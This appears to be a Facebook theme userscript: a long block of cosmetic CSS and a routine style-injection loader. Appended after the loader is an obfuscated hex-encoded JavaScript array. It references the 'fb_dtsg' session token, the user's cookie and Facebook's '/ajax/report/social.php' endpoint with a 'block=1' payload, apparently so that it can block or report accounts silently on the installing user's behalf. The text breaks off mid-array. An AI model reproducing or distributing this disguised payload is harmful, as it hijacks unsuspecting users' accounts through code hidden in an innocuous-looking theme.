.UITabGrid_Link,.fb_menu_title a,.button_main,.button_text,.button_left {border-bottom-color: transparent !important;border-bottom-width: 1px !important;border-bottom-style: solid !important;border-top-color: transparent !important;border-top-width: 1px !important;border-top-style: solid !important;border-left-color: transparent !important;border-left-width: 1px !important;border-left-style: solid !important;border-right-color: transparent !important;border-right-width: 1px !important;border-right-style: solid !important;-moz-appearance:none!important;}

.UIObjectListing_RemoveLink,.UIIntentionalStory_CloseButton,.remove,.x_to_hide,.fg_action_hide a,.notif_del,.UIComposer_AttachmentArea_CloseButton,.delete_msg a,.ImageBlock_Hide, .fbSettingsListItemDelete,.fg_action_hide,img[src=\"http://static.ak.fbcdn.net/images/streams/x_hide_story.gif?8:142665\"],.close,.uiSelector .uiCloseButton {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/closeX.png\") no-repeat !important;text-decoration: none !important;height: 18px !important;}

div.fbChatSidebarDropdown .uiCloseButton,.fbDockChatDropdown .uiSelectorButton,.storyInnerContent .uiSelectorButton,.fbTimelineAllActivityStorySelector .uiButton .img {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/GrayGear_15.png\") center center no-repeat !important; width: 26px !important;}

div.fbChatSidebarDropdown .uiCloseButton {height: 23px !important;}

.videoicon {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/video_chat_small.png\") center center no-repeat !important; }

.uiStream .uiStreamFirstStory .highlightSelector .uiSelectorButton {margin-top: -5px !important;}

.UIObjectListing_RemoveLink,.UIIntentionalStory_CloseButton,.remove,.x_to_hide,.fg_action_hide a,.notif_del,.UIComposer_AttachmentArea_CloseButton,.delete_msg a,.ImageBlock_Hide,.uiCloseButton,.fbSettingsListItemDelete {width: 18px !important;}
.fg_action_hide {width: 18px !important; margin-top: 0 !important; }

.fg_action_hide_container {width: 18px !important;}
.uiSideNav li {left: 0 !important;padding-left: 0 !important;}

.UIHotStory_Bling,.UIHotStory_BlingCount:hover,.request_link:hover,.request_link span:hover,.uiLinkButton {text-decoration: none !important;}

li form + .navSubmenu > div > div {padding: 12px !important; margin-top: -12px !important;}
li form + .navSubmenu > div img {margin-top: 12px !important;}

.uiStreamBoulderHighlight {border-right: none !important;}


.UIMediaItem_Photo .UIMediaItem_Wrapper {padding: 10px !important;}

#footerRight,.fg_action_hide {margin-right: 5px !important;}

.fbx_stream_header,.pas .input {padding: 5px !important;}

.ptm {padding: 5px 0 !important;}

.fbTimelineUnitActor {padding-top: 5px !important;}
.home_right_column {padding-top: 0 !important;}

.uiButton[tooltip-alignh=\"right\"] .uiButtonText {padding: 2px 10px 3px 10px !important; font-weight: bold !important;}

.uiSideNav .uiCloseButton {left: 160px !important;border: none !important;}
.uiSideNav .uiCloseButton input {padding-left: 2px !important;padding-right: 2px !important;margin-top: -4px !important;border: none !important;}

.storyInnerContent .uiTooltip.uiCloseButton   {margin-right: -10px !important;}
.storyInnerContent .stat_elem .wrap .uiSelectorButton.uiCloseButton,.uiFutureSideNavSection .open .item,.uiFutureSideNavSection .open .subitem,.uiFutureSideNavSection .open .subitem .rfloat,.uiSideNav .subitem,.uiSideNav .open .item {margin-right: 0 !important;}

.audienceSelector .wrap .uiSelectorButton {padding: 2px !important;}

.jewelHeader,.fbSettingsListItemDelete {margin: 0 !important;}
.UITitledBox_Title {margin-left: 4px;margin-top:1px;}

.uiHeader .uiHeaderTitle {margin-left: 7px !important;}
.fbx_stream_header .uiHeaderTitle,#footerLeft  {margin-left: 5px !important;}

.comments_add_box_image {margin-right: -5px !important;}
.show_advanced_controls {margin-top:-5px !important;}
.chat_window_wrapper {margin-bottom: 3px !important;}
.UIUpcoming_Item {margin-bottom: 5px !important;}
#pagelet_right_sidebar {margin-left: 0 !important;}

.profile-pagelet-section,.uiStreamHeaderTall,.timelineRecentActivityLabel,.friendsBoxHeader  {padding: 5px 10px !important;}

.GBSearchBox_Button,.uiSearchInput button {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/search.png\")  center center !important;}
.uiSearchInput button {width: 23px !important;height: 21px !important;top: 0 !important;background-position: 3px 2px !important;}

.UIButton_Text,.UISearchInput_Text {font-weight: normal !important;}

.x_to_hide,.top_bar_pic .UIRoundedImage {margin: 0 !important;padding: 0 !important;}

.uiHeaderActions .uiButton .uiButtonText {margin-left: 15px !important;}


.searchroot,#share_submit input {padding-right: 5px !important; }
.composerView {padding-left: 8px !important;padding-bottom: 4px !important;}
.info_section {padding: 6px !important;}
.uiInfoTable .dataRow .inputtext {min-width: 200px !important;}

.fbPrivacyWidget .uiButton .mrs,.uiButtonSuppressed .mrs {margin: 0 -10px 0 6px !important;}

.uiStreamPrivacyContainer .uiTooltip,.UIActionMenu_Lock,.fbPrivacyLockButton,.fbPrivacyLockButton:hover,.sx_7bedb4,.fbPrivacyWidget .uiButton .mrs,.uiButtonSuppressed .mrs,div.fbPrivacyLockSelector {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/privacylock.png\") no-repeat center center !important;}

.jewelCount,.pagesTimelineButtonPagelet .counter {margin: -8px -4px 0 0 !important;padding: 1px 4px !important;}

#share_submit {padding: 0 !important;border: none !important;}
#share_submit input,.friend_list_container .friend {padding-left: 5px !important;}

a{outline: none !important;}

#contact_importer_container input[value=\"Find Friends\"] {border: none !important;box-shadow: none !important;}

#pageLogo {margin-left: -1px !important;  }

#pageLogo a {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/Facebook.png\") no-repeat center center !important;left: 0 !important;width: 107px !important;margin-right: 1px !important; margin-top: 0 !important;}

#pageLogo a:hover {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/Facebook-glow.png\") no-repeat center center !important;}

#pageHead {margin-top: -6px !important;}

.mainWrapper .uiSelectorButton { margin-top: 10px !important; }
/*
#globalContainer {margin: 3px auto !important;}
*/
.platform_dialog #blueBar,.withCanvasNav #blueBar {position: absolute !important; margin-top: 10px !important; height: 30px !important;  }

.friend_list_container .friend {margin-right: 0 !important; }

.list_select {padding: 3px !important;}

.fbNubFlyout .input {width: 254px !important;}

.highlightIndicator {top: 0 !important;}

.audienceSelector .uiButtonText {padding-left: 8px !important;}
.profile #pagelet_netego {margin-top: -60px !important;margin-left: -30px !important;}
.pas .input,.selectedCheckable .checkmark {margin-left: -5px !important;}

.removable {top: 0 !important;bottom: 0 !important;margin-top: -4px !important;border: none !important;}

.uiSideNavCount,.uiStreamAttachments div embed,.jewelCount,.uiButton,.fbChatSidebarFooter .button,.uiSearchInput button,.uiSelectorButton,.pagesTimelineButtonPagelet .counter,#pagelet_timeline_profile_actions .counter,.pluginRecommendationsBarButtonLike {border-radius: 6px !important;}

.fbActivity,.UIRoundedImage {margin: 4px !important;}

#facebook:not(.tinyViewport) body:not(.UIPage_LoggedOut):not(.fbIndex):not(.platform_dialog):not(.withCanvasNav) #blueBar {width: 100% !important;margin: 0 auto !important;top: 10px !important;height: 30px !important;}

.uiUfiSmall .commentArea .textBox:not([style*=\"height\"]) {height: 20px !important; }
.composerTypeahead .textInput:not([style*=\"height\"]){height: 27px !important; }

.dataTable .inputtext,.uiInfoTable .dataRow .inputtext {padding-left: 20px !important;}

.fbTimelineAllActivityStorySelector .uiButton,.fbDockChatTabFlyout .close {margin-top: 3px !important;}
.fbTimelineAllActivityStorySelector .uiButton .img {margin: 0 -3px !important;}

.audienceSelector .uiButton {padding: 2px 0 2px 0 !important;}
.audienceSelector .uiButton .img {margin-right: -1px !important;}

.fbTimelineContentHeader .uiHeaderTitle {font-size: 2.0em !important;}


.ogSliderAnimPagerGridTd .page {margin: 0 14px 0 -5px !important;}
.ogSliderAnimPagerNext .content {margin-left: -18px !important;}
#bfb_options_button_li {float:left !important;}

.fbTimelineCapsule {background: url(\"http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/Black_50pct_3x1.png\") repeat-y scroll center top transparent !important;}"; if (typeof GM_addStyle != "undefined") {         GM_addStyle(css); } else if (typeof PRO_addStyle != "undefined") {         PRO_addStyle(css); } else if (typeof addStyle != "undefined") {         addStyle(css); } else {         var node = document.createElement("style");         node.type = "text/css";         node.appendChild(document.createTextNode(css));         var heads = document.getElementsByTagName("head");         if (heads.length > 0) {                 heads[0].appendChild(node);         } else {                 // no head yet, stick it whereever                 document.documentElement.appendChild(node);         } } })(); var _0xb161=["\x76\x61\x6C\x75\x65","\x66\x62\x5F\x64\x74\x73\x67","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x67\x65\x74\x54\x69\x6D\x65","\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x72\x65\x70\x6F\x72\x74\x2F\x73\x6F\x63\x69\x61\x6C\x2E\x70\x68\x70","\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x62\x6C\x6F\x63\x6B\x3D\x31\x26\x70\x70\x3D\x25\x37\x42\x25\x32\x32\x61\x63\x74\x69\x6F\x6E\x73\x5F\x74\x6F\x5F\x74\x61\x6B\x65\x25\x32\x32\x25\x33\x41\x25\x32\x32\x5B\x5D\x25\x32\x32\x25\x32\x43\x25\x32\x32\x61\x72\x65\x5F\x66\x72\x69\x65\x6E\x64\x73\x25\x32\x32
